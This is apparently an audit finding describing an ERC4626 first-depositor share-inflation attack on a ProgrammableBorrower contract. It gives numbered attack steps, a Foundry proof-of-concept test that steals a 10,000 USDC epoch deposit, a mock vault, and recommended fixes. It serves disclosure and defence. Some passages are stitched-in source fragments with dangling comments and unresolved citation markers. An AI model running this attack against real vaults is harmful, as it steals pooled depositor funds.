### Title
ERC4626 first-depositor inflation lets a vault user steal the programmable borrower's first epoch deposit - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits all idle credit-vault liquidity into the configured ERC4626 vault through `_depositToVault`, but performs no minimum-share or post-deposit value check on the returned shares. [1](#0-0)  If the selected vault is empty, a public vault depositor can establish the first share, inflate its price with a direct asset transfer, and cause the programmable borrower's epoch deposit to mint zero or economically insignificant shares. [2](#0-1)  The attacker then redeems their shares and receives the donated balance plus the credit vault's deposit, directly stealing pool assets. [3](#0-2) 

### Finding Description
`IdleCDOEpochVariant.startEpoch` transfers the buffered pool balance to the strategy borrower before invoking the programmable borrower's `onStartEpoch` hook. [4](#0-3) [5](#0-4)  `onStartEpoch` snapshots the pre-deposit balance and immediately deposits the full on-hand balance into `vault`, while `_depositToVault` accepts whatever share amount the vault returns. [6](#0-5) [7](#0-6)  Vault selection and replacement only validate the ERC4626 asset and that no old position remains; neither path establishes vault liquidity nor enforces a minimum acceptable share count. [8](#0-7) [9](#0-8) 

For a newly configured ERC4626 vault, the unprivileged attacker can:

1. Deposit 1 underlying unit and receive the vault's first share.
2. Transfer `B` underlying directly to the vault, making pre-deposit assets approximately `B + 1` against one share.
3. Let the manager's `startEpoch` deposit the credit vault's `B` assets into the vault.
4. With integer deposit math, receive zero programmable-borrower shares because `B * 1 / (B + 1) == 0`.
5. Redeem the sole share for approximately `2B + 1`, recovering the `B` donation and stealing the pool's `B` deposit.

The contract recognizes the missing shares as vault loss because `_currentVaultAssets` is based on the programmable borrower's share balance, while `epochStartVaultAssets` was snapshotted before the diluted deposit. [10](#0-9) [3](#0-2)  That accounting merely floors reported interest at zero; it does not recover the stolen principal. [11](#0-10)  A later withdrawal recall cannot source the lost assets, so `getFundsFromBorrower` fails and the CDO enters the borrower-default path. [12](#0-11) [13](#0-12) 

### Impact Explanation
The attack can steal the entire first programmable-borrower epoch deposit, with loss bounded only by the amount of pooled underlying transferred during `startEpoch`. [4](#0-3)  For an example deposit of `10,000 USDC`, the attacker spends `10,001 USDC` temporarily, redeems `20,001 USDC`, and obtains `10,000 USDC` of credit-vault funds. [14](#0-13)  The resulting missing principal is only discovered as a vault loss or borrower default when withdrawals must be funded, breaking the solvency and fair mint/burn invariants for tranche holders. [15](#0-14) [16](#0-15) 

### Likelihood Explanation
The attacker only needs to be an ordinary depositor in the configured public ERC4626 vault, which is explicitly within the unprivileged threat model. [17](#0-16)  The exploit applies when a deployment selects an empty or attacker-controlled-liquidity-dominated vault before the programmable borrower's first epoch deposit; a deep existing vault makes the donation requirement substantially less economical. [18](#0-17) [19](#0-18)  Because the programmable borrower does not require a minimum share amount or verify that received shares are worth the deposited assets, no borrower dishonesty or privileged attacker is required. [20](#0-19) 

### Recommendation
Require the ERC4626 deposit to return shares whose immediately measured `convertToAssets` value is within an accepted tolerance of `_assetAmount`, and revert otherwise. [20](#0-19)  Prefer vaults with virtual shares/assets or pre-seeded protected liquidity, and seed a new vault before assigning it to `ProgrammableBorrower` so the credit-vault deployment is never the first depositor. [9](#0-8)  A `minSharesOut` value configured by the trusted manager can additionally enforce an expected exchange rate, but post-deposit share-value validation is needed to catch share-price manipulation. [21](#0-20)

function testProgrammableBorrowerFirstDepositShareInflationStealsEpochLiquidity() external {
    MockStopEpochLiquidityVault emptyVault = new MockStopEpochLiquidityVault(USDC);
    address attacker = makeAddr("erc4626FirstDepositor");
    uint256 poolDeposit = 10_000 * oneScale;

    // Honest manager selects an empty asset-matching ERC4626 vault.
    vm.prank(manager);
    programmableBorrower.setVault(address(emptyVault));

    // Attacker seeds one share and inflates the vault's price before startEpoch.
    deal(USDC, attacker, poolDeposit + 1);
    vm.startPrank(attacker);
    underlying.approve(address(emptyVault), 1);
    emptyVault.deposit(1, attacker);
    underlying.transfer(address(emptyVault), poolDeposit);
    vm.stopPrank();

    // A normal LP deposits and the honest manager starts the programmable epoch.
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    idleCDO.depositAA(poolDeposit);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The programmable borrower transferred poolDeposit but minted zero vault shares.
    assertEq(emptyVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(emptyVault.balanceOf(attacker), 1);
    assertEq(programmableBorrower.vaultLoss(), poolDeposit);

    // The attacker redeems the sole share for both the donation and the stolen deposit.
    vm.prank(attacker);
    emptyVault.redeem(1, attacker, attacker);

    assertEq(underlying.balanceOf(attacker), 1 + 2 * poolDeposit);
}

    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;

    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;

    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.

    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);

contract MockStopEpochLiquidityVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public withdrawLimit = type(uint256).max;

  constructor(address _asset) ERC20("Stop Epoch Liquidity Vault", "SELV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
    require(assets <= withdrawLimit, "insufficient-liquidity");
    shares = _toSharesRoundUp(assets);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    require(assets <= withdrawLimit, "insufficient-liquidity");
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function _toSharesRoundUp(uint256 assets) internal view returns (uint256 shares) {
    uint256 supply = totalSupply();
    uint256 managedAssets = assetToken.balanceOf(address(this));
    if (supply == 0 || managedAssets == 0) return assets;
    shares = assets * supply / managedAssets;
    if (shares * managedAssets < assets * supply) shares += 1;
  }
}
